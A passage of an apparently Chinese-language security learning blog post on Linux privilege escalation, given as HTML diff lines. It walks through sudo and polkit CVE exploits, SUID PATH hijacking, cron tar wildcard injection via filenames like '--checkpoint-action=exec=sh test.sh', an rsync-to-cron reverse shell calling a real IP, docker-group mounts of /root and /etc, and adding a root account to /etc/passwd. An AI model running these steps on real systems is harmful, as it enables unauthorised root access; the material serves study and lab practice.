+<h4 id="SUDO-CVE-2021-3156"><a href="#SUDO-CVE-2021-3156" class="headerlink" title="SUDO(CVE-2021-3156)"></a>SUDO(CVE-2021-3156)</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php">sudo -V<br>sudo: <span class="hljs-number">1.8</span>.<span class="hljs-number">2</span> - <span class="hljs-number">1.8</span>.<span class="hljs-number">31</span>p2<br>sudo: <span class="hljs-number">1.9</span>.<span class="hljs-number">0</span> - <span class="hljs-number">1.9</span>.<span class="hljs-number">5</span>p1<br>-判断: sudoedit -s / 报错存在。则漏洞存在-利用:<br>git <span class="hljs-keyword">clone</span> https:<span class="hljs-comment">//github.com/blasty/CVE-2021-3156.gitcd CVE-2021-3156</span><br>make<br>chmod a+x sudo-hax-me-a-sandwich./sudo-hax-me-a-sandwich <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>
+
+<h4 id="Polkit-CVE-2021-4034"><a href="#Polkit-CVE-2021-4034" class="headerlink" title="Polkit(CVE-2021-4034)"></a>Polkit(CVE-2021-4034)</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php">漏洞影响<span class="hljs-number">2009</span>年<span class="hljs-number">5</span>月至今的所有polkit版本<br>由于polkit是系统预装工具，所有存在polkit的<span class="hljs-number">1</span>inux系统均受影响如: Centos、Ubuntu、Debian、Redhat、Fedora、Gentoo、Mageia等-判断: dpkg -<span class="hljs-number">1</span> policykit-<span class="hljs-number">1</span>-利用:<br>git <span class="hljs-keyword">clone</span> https:<span class="hljs-comment">//github.com/berdav/CVE-2021-4034.gitcd CVE-2021-4034/</span><br>make<br>./cve-<span class="hljs-number">2021</span>-<span class="hljs-number">4034</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="环境变量"><a href="#环境变量" class="headerlink" title="环境变量"></a>环境变量</h3><h5 id="条件"><a href="#条件" class="headerlink" title="条件"></a>条件</h5><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">ROOT用户对某个第三方程序给予了SUID权限<br></code></pre></td></tr></table></figure>
+
+<h5 id="探测-1"><a href="#探测-1" class="headerlink" title="探测"></a>探测</h5><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">探针: <span class="hljs-built_in">find</span> / -user root -perm -4000 -<span class="hljs-built_in">print</span> 2&gt;/dev/<span class="hljs-literal">null</span><br></code></pre></td></tr></table></figure>
+
+<h5 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php">首先root用户操作:<br>root用户讲可执行文件进行编译，<br>保证文件的正常授权运行，给予ROOT权限执行<br>gcc demo.c -o shell<br>chmod u+s shell<br>其次普通用户操作:<br>普通用户通过对文件反编译或源代码查看，覆盖其执行环境变量，直接让其执行指定程序获取权限<br>  cp /bin/bash /tmp/ps<br>  export PATH=/tmp:<span class="hljs-variable">$PATH</span><br>  ./shell<br>  id<br>过程分析:<br><span class="hljs-number">1</span>.先获取suid程序<br><span class="hljs-number">2</span>.去除系统自带的<br><span class="hljs-number">3</span>.下载这个程序进行反编译<br></code></pre></td></tr></table></figure>
+
+<p><img src="/image/1-16841344324143.png" srcset="/img/loading.gif" lazyload alt="1"></p>
+<p><img src="/image/2-16841344324144.png" srcset="/img/loading.gif" lazyload alt="2"></p>
+<p><img src="/image/3.png" srcset="/img/loading.gif" lazyload alt="3"></p>
+<p><img src="/image/4-16841344324122.png" srcset="/img/loading.gif" lazyload alt="4"></p>
+<h3 id="定时任务提权"><a href="#定时任务提权" class="headerlink" title="定时任务提权"></a>定时任务提权</h3><p>定时任务&amp;tar&amp;suid<br>&#x2F;etc&#x2F;crontab</p>
+<h5 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h5><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs stata">利用定时任务配置不规范导致的安全风险<br>例如 执行的脚本(xx.<span class="hljs-keyword">sh</span>) 如下<br><span class="hljs-keyword">cd</span> /tmp;tar zxf bckup.tar .gz*<br>在文件名“bckup.tar.gz*”的末尾的星号 (*) 是一个通配符，匹配当前目录中以“bckup,tar.gz”开头并在其后有其他字符的任何文件。当一个归档文件被分成多个文件以便于传输或存储时，这非常有用。这样当文件夹下面有列入“--checkpoint-action=exec=<span class="hljs-keyword">sh</span> <span class="hljs-keyword">test</span>.<span class="hljs-keyword">sh</span>”的文件时。就会有如下效果-&gt;tar zxf bckup.tar.gz --checkpoint-action=exec=<span class="hljs-keyword">sh</span> <span class="hljs-keyword">test</span>.<span class="hljs-keyword">sh</span>--&gt;tar zxf bckup ,tar.gz --checkpoint=1<br></code></pre></td></tr></table></figure>
+
+<h5 id="条件-1"><a href="#条件-1" class="headerlink" title="条件"></a>条件</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// 提权通过获取计划任务执行文件信息进行提权</span><br><span class="hljs-number">1</span>、相对路径和绝对路径执行<br><span class="hljs-number">2</span>、计划任务命令存在参数调用<br></code></pre></td></tr></table></figure>
+
+<h6 id="复现条件"><a href="#复现条件" class="headerlink" title="复现条件"></a>复现条件</h6><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-number">1</span>.上传环境复现定时脚本:bak.sh<br>cd /tmp;tar lzxf bckup.tar .gz<br>cd /tmp;tar czf /tmp/backup.tar.gz *<br>  (注意上传后要赋权 chmod +x bak.sh)<br><span class="hljs-number">2</span>.配置定时任务:<br>    */<span class="hljs-number">1</span> * * * * root /tmp/bak.sh<br><span class="hljs-number">3</span>.开启定时任务:<br>   /sbin/service crond start<br>crontab -u root -l<br>---定时相关其他命令---/sbin/service crond stop <span class="hljs-comment">//关闭服务</span><br>/sbin/service crond restart <span class="hljs-comment">//重启服务</span><br>/sbin/service crond reload <span class="hljs-comment">//重新载入配置</span><br>/sbin/service crond status <span class="hljs-comment">//启动服务</span><br></code></pre></td></tr></table></figure>
+
+<h5 id="利用-1"><a href="#利用-1" class="headerlink" title="利用"></a>利用</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php">在相关命令下执行目录。利用计划任务的备份功能tar命令的参数利用<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot; &quot;</span> &gt; <span class="hljs-string">&quot;--checkpoint-action=exec=sh test.sh&quot;</span>  <span class="hljs-comment">#以命令参数命名的文件</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot; &quot;</span> &gt; --checkpoint=<span class="hljs-number">1</span><br><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;cp /bin/bash /tmp/bash; chmod +s /tmp/bash&#x27;</span> &gt; test.sh<br>chmod +x test.sh<br>==》等待定时任务被执行<br>运行 ./bash -<span class="hljs-title function_ invoke__">p</span>(到这相当于用SUID提权)<br></code></pre></td></tr></table></figure>
+
+<h3 id="定时任务-文件权限"><a href="#定时任务-文件权限" class="headerlink" title="定时任务&amp;文件权限"></a>定时任务&amp;文件权限</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php">同样以上面这个定时任务为例子假如，root用户给这个脚本赋权的时候 用的<span class="hljs-number">777</span> 或者 <span class="hljs-number">775</span> 赋权<br>那么我们低配用户。就有修改这个脚本的权限<br><br><span class="hljs-comment">// 可修改为反弹命令</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/image/image-20230505170751181.png" srcset="/img/loading.gif" lazyload alt="image-20230505170751181"></p>
+<h3 id="Rsync-未授权访问提权"><a href="#Rsync-未授权访问提权" class="headerlink" title="Rsync(未授权访问提权)"></a>Rsync(未授权访问提权)</h3><h5 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php">Rsync是linux下一款数据备份工具，默认开启<span class="hljs-number">873</span>端口借助Linux默认计划任务调用/etc/cron.hourly，利用rsync连接覆盖<br>环境搭建<span class="hljs-number">1</span>:<br>https:<span class="hljs-comment">//vulhub.org/#/environments/rsync/common/</span><br><span class="hljs-comment">#可选</span><br>docker-compose build<br>docker-compose upload<br>环境搭建<span class="hljs-number">2</span>:<br>或者在线靶场:<br>https:<span class="hljs-comment">//vulfocus.cn/#/dashboard</span><br>环境搭建<span class="hljs-number">3</span>:<br>yum -y install rsync <br>vim /etc/rsyncd.conf 配置一下 （配置文件在环境搭建文件夹里面）<br>rsync --daemon<br></code></pre></td></tr></table></figure>
+
+<p><img src="/image/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20230516102123.png" srcset="/img/loading.gif" lazyload alt="微信截图_20230516102123"></p>
+<h5 id="提权过程"><a href="#提权过程" class="headerlink" title="提权过程"></a>提权过程</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php">rsync rsync:<span class="hljs-comment">//ip:873</span><br>rsync rsync:<span class="hljs-comment">//192.168.156.135:873/src</span><br><span class="hljs-number">123</span> <span class="hljs-number">.58</span>.<span class="hljs-number">224.8</span>:<span class="hljs-number">55295</span><br>-提权过程:<br><span class="hljs-number">1</span>、创建一个nc文件，内容<br><span class="hljs-comment">#!/bin/bash</span><br>bash -i &gt;&amp; /dev/tcp/<span class="hljs-number">43.138</span>.<span class="hljs-number">215.2</span>/<span class="hljs-number">3333</span> <span class="hljs-number">0</span>&gt;&amp;<span class="hljs-number">1</span><br><span class="hljs-number">2</span>、赋予执行权限:<br>chmod +x nc<br><span class="hljs-number">3</span>、上传文件覆盖定时任务目录下<br>rsync -av nc rsync:<span class="hljs-comment">//192.168.156.135:873/src/etc/cron.hourly/</span><br><span class="hljs-number">4</span>、下载文件<br>rsync -av rsync:<span class="hljs-comment">//192.168.156.135:873/src/etc/crontab ./</span><br>rsync -av rsync:<span class="hljs-comment">//192.168.156.135:873/src/etc/passwd ./</span><br><span class="hljs-number">5</span>、进行nc 监听相应的端口<br>nc -lvp <span class="hljs-number">3333</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/image/QQ%E6%88%AA%E5%9B%BE20230516115704.jpg" srcset="/img/loading.gif" lazyload alt="QQ截图20230516115704"></p>
+<h3 id="Docker组挂载"><a href="#Docker组挂载" class="headerlink" title="Docker组挂载"></a>Docker组挂载</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// root --&gt; docker --&gt;images</span><br><span class="hljs-comment">// boy --&gt; docker</span><br></code></pre></td></tr></table></figure>
+
+<h5 id="复现环境"><a href="#复现环境" class="headerlink" title="复现环境"></a>复现环境</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php">普通用户在docker组，利用docker服务启动镜像挂载目录<br>从而来访问root目录、etc目录等敏感文件来进行权限提升。<br>-复现: 创建用户归类目录，添加到docker组<br>useradd test<br>passwd test<br>用root用户去改test用户的所属组，使test用户进入到docker组里<br>usermod -G docker test		<span class="hljs-comment">#添加test用户到docker组</span><br>newgrp docker			 <span class="hljs-comment">#更新docker组</span><br></code></pre></td></tr></table></figure>
+
+<h5 id="利用-2"><a href="#利用-2" class="headerlink" title="利用"></a>利用</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs php">拉取alpine镜像<br>$ docker pull hub-mirror.c.<span class="hljs-number">163</span>.com/library/alpine<br>$ docker pull registry.cn-hangzhou.aliyuncs.com/library/alpine<br>启动alpine镜像<br>docker run -v /root:/mnt -it alpine<br>主要的作用是: 从Docker上面下载alpine镜像，然后运行;<br>-v将容器外部的目录/root挂载到容器内部/mnt，使用-it参数进入容器shell。<br>docker run -v /etc:/mnt -it alpine<br>cd /mnt<br>id  <span class="hljs-comment">#提升到了root权限</span><br>ls  <span class="hljs-comment">#可看见/etc中的内容。并且可以修改</span><br>-------------------<br>常见问题<br>-------------------<br>alpine 镜像是什么?<br>alpine 镜像通常被用作轻量级的基础镜像，用于构建容器化应用。由于其体积小,可以快速地下载和部署效地减小镜像的大小，减少镜像构建和部署的时间。<br>同时也能有<br>etc 目录下，shadow与passwd区别?<br>  /etc/shadow 文件包含了所有系统用户的密码散列值以及其他与密码相关的信息，例如密码最后一次修改的时间、密码过期时间、账户是否被锁定等等。这个文件的每一行都对应一个用户。<br>passwd中密码部分为x的原因?<br>在/etc/passwd文件中，密码字段的通常被设置为“x”或“*”字符，这意味着密码存储在/etc/shadow文件中。这样做的目的是为了保护密码信息的安全性，避免让未经授权的用户通过查看/etc/passwd文件来获得密码信息。只有系统管理员和特定的用户才有权限查看/etc/shadow文件，因为它包含了经过哈希处理的密码信息。<br></code></pre></td></tr></table></figure>
+
+<h5 id="深入利用"><a href="#深入利用" class="headerlink" title="深入利用"></a>深入利用</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php">openssl passwd -<span class="hljs-number">1</span> -salt raj<br>获取到密码: $<span class="hljs-number">1</span>SrajscgoI1m5chsDvPuQrsxOuuO<br><span class="hljs-comment">// 在/etc/passwd文件后面添加相应内容，实现通过passwd添加特权账号</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;raj:&lt;上面获取到的密钥&gt;:0:0::/root:/bin/bash&#x27;</span> &gt;&gt;passwd<br></code></pre></td></tr></table></figure>
+
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" class="category-chain-item">网络安全</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF/" class="print-no-link">#安全技术</a>
+      
+        <a href="/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" class="print-no-link">#学习笔记</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>权限提升linux</div>
+      <div>http://example.com/2023/06/14/权限提权linux/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>JUNYI</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2023年6月14日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2024/03/14/arp%E4%B8%8Edns%E4%B8%8Eddos/" title="arp与dns与ddos">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">arp与dns与ddos</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2023/02/14/mysql%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83/" title="mysql数据库提权">
+                        <span class="hidden-mobile">mysql数据库提权</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <i class="iconfont icon-love"></i> <a href="/" target="_blank" rel="nofollow noopener"><span>JUNYI</span></a> 
+    </div>
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
